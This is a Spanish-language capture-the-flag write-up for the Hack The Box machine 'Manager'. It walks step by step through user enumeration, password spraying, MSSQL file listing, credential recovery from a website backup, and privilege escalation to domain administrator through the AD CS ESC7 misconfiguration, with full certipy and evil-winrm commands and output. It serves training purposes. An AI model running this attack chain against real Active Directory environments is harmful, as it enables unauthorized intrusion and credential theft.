---
layout: single
title: Manager - Hack The Box
excerpt: "Manager es una máquina Windows de dificultad media que alberga un entorno de Active Directory con AD CS (Active Directory Certificate Services), un servidor web y un servidor SQL. El punto de entrada implica enumerar usuarios utilizando RID cycling y realizar un ataque de contraseña para acceder al servicio MSSQL. Luego, se utiliza el procedimiento xp_dirtree para explorar el sistema de archivos, descubriendo una copia de seguridad del sitio web en la raíz del servidor web. Extrayendo la copia de seguridad se revelan credenciales que se reutilizan para conectarse a través de WinRM al servidor. Finalmente, el atacante escala privilegios a través de AD CS mediante la explotación de ESC7."
date: 2024-03-16
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-manager/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - ADCS
  - MSSQL service
  - ESC7
---

## PortScan

- Comenzamos escaneando los puertos abiertos por el protocolo **TCP**.

```bash
➜  nmap sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49669,49670,49671,49721,56310,60346 10.10.11.236 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 11:44 CST
Nmap scan report for 10.10.11.236
Host is up (0.17s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 00:45:13Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-17T00:46:48+00:00; +7h00m01s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-15T21:10:24
|_Not valid after:  2054-03-15T21:10:24
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-17T00:46:48+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49721/tcp open     msrpc         Microsoft Windows RPC
56310/tcp filtered unknown
60346/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time:
|   date: 2024-03-17T00:46:08
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

## Enumeración de usuarios

- Bueno primero vamos a agregar los dominios que tenemos al archivo **/etc/hosts***.

```bash
➜  nmap echo "10.10.11.236 dc01.manager.htb manager.htb" | sudo tee -a /etc/hosts
10.10.11.236 dc01.manager.htb manager.htb
```

- Estamos ante un **Windows 10**.

```bash
➜  nmap crackmapexec smb 10.10.11.236
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
```

- Vamos a comenzar enumerando por el protocolo **smb** para ver si podemos ver recursos compartidos.

- Solo vemos esto.

```bash
➜  nmap crackmapexec smb 10.10.11.236 -u "miguel" -p "" --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\miguel:
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share
SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
➜  nmap
```

- Podemos enumerar usuarios tanto por **kerberos** y con **crackmapexec** vamos a usar **kerberos** primero.

```bash
➜  content ./kerbrute userenum -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc dc01.manager.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/16/24 - Ronnie Flathers @ropnop

2024/03/16 12:01:09 >  Using KDC(s):
2024/03/16 12:01:09 >  	dc01.manager.htb:88

2024/03/16 12:01:12 >  [+] VALID USERNAME:	 ryan@manager.htb
2024/03/16 12:01:18 >  [+] VALID USERNAME:	 guest@manager.htb
2024/03/16 12:01:21 >  [+] VALID USERNAME:	 cheng@manager.htb
2024/03/16 12:01:23 >  [+] VALID USERNAME:	 raven@manager.htb
2024/03/16 12:01:38 >  [+] VALID USERNAME:	 administrator@manager.htb
2024/03/16 12:02:12 >  [+] VALID USERNAME:	 Ryan@manager.htb
2024/03/16 12:02:19 >  [+] VALID USERNAME:	 Raven@manager.htb
2024/03/16 12:02:37 >  [+] VALID USERNAME:	 operator@manager.htb
```

- Y bueno tenemos usuarios lo que podemos hacer ahora es un **Password Spraying** para ver si algun usuario usa su nombre de usuario como contraseña.

```bash
➜  content crackmapexec smb 10.10.11.236 -u list.txt -p list.txt --no-brute --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```

- Y bueno con esto sabemos que el usuario **operator:operator** son sus credenciales, pero si revisamos no podemos usar **evil-winrm** para conectarnos ala máquina.

```bash
➜  content crackmapexec winrm 10.10.11.236 -u "operator" -p "operator"
SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [-] manager.htb\operator:operator
```

 - Tenemos privilegios de lectura en esos directorios.

```bash
➜  content crackmapexec smb 10.10.11.236 -u "operator" -p "operator" --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

## MSSQL 

- Si recordamos tenemos este puerto abierto.

```bash
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-17T00:46:50+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-15T21:10:24
|_Not valid after:  2054-03-15T21:10:24
```

- Podemos ver si nuestro usuario es válido para usar ese servicio.

```bash
➜  content crackmapexec mssql 10.10.11.236 -u "operator" -p "operator"
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
```

- Sabiendo esto podemos usar **impacket-mssqlclient** para conectarnos.

```bash
➜  content impacket-mssqlclient -port 1433 10.10.11.236/operator:operator@10.10.11.236 -window
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> SELECT name FROM sys.databases
name
------
master

tempdb

model

msdb

SQL (MANAGER\Operator  guest@master)>
```

- Ahora enumeramos las tablas.

```bash
SQL (MANAGER\Operator  guest@master)> SELECT * FROM sys.tables
name                object_id   principal_id   schema_id   parent_object_id   type   type_desc    create_date   modify_date   is_ms_shipped   is_published   is_schema_published   lob_data_space_id   filestream_data_space_id   max_column_id_used   lock_on_bulk_load   uses_ansi_nulls   is_replicated   has_replication_filter   is_merge_published   is_sync_tran_subscribed   has_unchecked_assembly_data   text_in_row_limit   large_value_types_out_of_row   is_tracked_by_cdc   lock_escalation   lock_escalation_desc   is_filetable   is_memory_optimized   durability   durability_desc   temporal_type   temporal_type_desc   history_table_id   is_remote_data_archive_enabled   is_external   history_retention_period   history_retention_period_unit   history_retention_period_unit_desc   is_node   is_edge
----------------   ----------   ------------   ---------   ----------------   ----   ----------   -----------   -----------   -------------   ------------   -------------------   -----------------   ------------------------   ------------------   -----------------   ---------------   -------------   ----------------------   ------------------   -----------------------   ---------------------------   -----------------   ----------------------------   -----------------   ---------------   --------------------   ------------   -------------------   ----------   ---------------   -------------   ------------------   ----------------   ------------------------------   -----------   ------------------------   -----------------------------   ----------------------------------   -------   -------
spt_fallback_db     117575457           NULL           1                  0   b'U '   USER_TABLE   2003-04-08 09:18:01   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    8                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

spt_fallback_dev    133575514           NULL           1                  0   b'U '   USER_TABLE   2003-04-08 09:18:02   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   10                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

spt_fallback_usg    149575571           NULL           1                  0   b'U '   USER_TABLE   2003-04-08 09:18:04   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    9                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

spt_monitor        1803153469           NULL           1                  0   b'U '   USER_TABLE   2019-09-24 14:21:40   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   11                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

SQL (MANAGER\Operator  guest@master)>
```

- Pero nada importante.

- No tenemos permiso de habilitar el `xp_cmdshell`.

```bash
SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
[-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (MANAGER\Operator  guest@master)>
```

- Ahora vamos a enumerar **files** con **xp_dirtree**.

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
subdirectory                depth   file
-------------------------   -----   ----
$Recycle.Bin                    1      0

Documents and Settings          1      0

inetpub                         1      0

PerfLogs                        1      0

Program Files                   1      0

Program Files (x86)             1      0

ProgramData                     1      0

Recovery                        1      0

SQL2019                         1      0

System Volume Information       1      0

Users                           1      0

Windows                         1      0
```

- Y bueno encontramos directorio interesante donde encontramos un **.zip**.

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1

contact.html                          1      1

css                                   1      0

images                                1      0

index.html                            1      1

js                                    1      0

service.html                          1      1

web.config                            1      1

website-backup-27-07-23-old.zip       1      1

SQL (MANAGER\Operator  guest@master)>
```

# Zip 

- Vamos a descargar el comprimido fácilmente.

```bash
➜  content wget http://10.10.11.236/website-backup-27-07-23-old.zip
--2024-03-16 12:30:07--  http://10.10.11.236/website-backup-27-07-23-old.zip
Connecting to 10.10.11.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip      100%[=====================================================================>]   1021K   933KB/s    in 1.1s

2024-03-16 12:30:08 (933 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

- Ahora vamos a descomprimirlo.

```bash
➜  content unzip website-backup-27-07-23-old.zip
Archive:  website-backup-27-07-23-old.zip
  inflating: .old-conf.xml
  inflating: about.html
  inflating: contact.html
  inflating: css/bootstrap.css
  inflating: css/responsive.css
  inflating: css/style.css
  inflating: css/style.css.map
  inflating: css/style.scss
  inflating: images/about-img.png
  inflating: images/body_bg.jpg
 extracting: images/call.png
 extracting: images/call-o.png
  inflating: images/client.jpg
  inflating: images/contact-img.jpg
 extracting: images/envelope.png
 extracting: images/envelope-o.png
  inflating: images/hero-bg.jpg
 extracting: images/location.png
 extracting: images/location-o.png
 extracting: images/logo.png
  inflating: images/menu.png
 extracting: images/next.png
 extracting: images/next-white.png
  inflating: images/offer-img.jpg
  inflating: images/prev.png
 extracting: images/prev-white.png
 extracting: images/quote.png
 extracting: images/s-1.png
 extracting: images/s-2.png
 extracting: images/s-3.png
 extracting: images/s-4.png
 extracting: images/search-icon.png
  inflating: index.html
  inflating: js/bootstrap.js
  inflating: js/jquery-3.4.1.min.js
  inflating: service.html
➜  content
```

## Shell as raven

- Si examinamos el archivo **old-conf.xml** encontramos credenciales.

```bash
➜  content cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

- Vamos a corroborar si podemos conectarnos con **evil-winrm**.

```bash
➜  content crackmapexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

## User flag

- Nos conectamos y podemos ver la flag.

```bash
➜  content evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> type C:\Users\Raven\Desktop\user.txt
192acfae62cbf1f9d9db96f43db90f99
*Evil-WinRM* PS C:\Users\Raven\Documents>
```

## Privilege Escalation

- No podemos hacer gran cosa.

```bash
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- Vamos a verificar los **Advice Directory Certificate Services** con la herramienta .

```bash
➜  content certipy-ad find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

## ESC7 

- Y bueno ya nos reporta que es vulnerable a **ESC7** esta vulnerabilidad se produce cuando un usuario tiene derechos de acceso elevados sobre el propio servicio de Certificate Authority (CA) o sobre la administración de certificados. En este caso específico, el usuario "Raven" tiene derechos de "ManageCA" (Administrar CA) .

- Lo primero que vamos a hacer es sincronizarnos con el reloj del dominio.

```bash
➜  content sudo ntpdate -u manager.htb
2024-03-16 19:52:19.262396 (-0600) +25200.544784 +/- 0.076829 manager.htb 10.10.11.236 s1 no-leap
CLOCK: time stepped by 25200.544784
```

- Ahora vamos a usar **certipy** necesitamos usar el **Manage CA permission**.

```bash
➜  content certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

- Vamos a solicitar un certificado, falla, pero tenemos la clave.

```bash
➜  content certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 18
Would you like to save the private key? (y/N) y
[*] Saved private key to 18.key
[-] Failed to request certificate
```

- Ahora vamos a emitir un certificado apartar de la solicitud previamente generada.

```bash
➜  content certipy-ad ca -ca manager-DC01-CA -issue-request 18 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

- Ahora vamos a recuperar el certificado emitido.

```bash
➜  content certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 18 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 18
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '18.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

## Shell as Administrator

- Ahora con este certificado podemos obtener el hash **NTLM** del usuario administrador para esto es muy importante que tu reloj esté previamente sincronizado con la máquina.

```bash
➜  content certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT 
[*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

- Ahora nos conectamos ala máquina como administrador.

```bash
➜  content evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## root.txt

- Vemos la root flag.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
b6a4acc041a47c288ef5c9a5f085678e
```
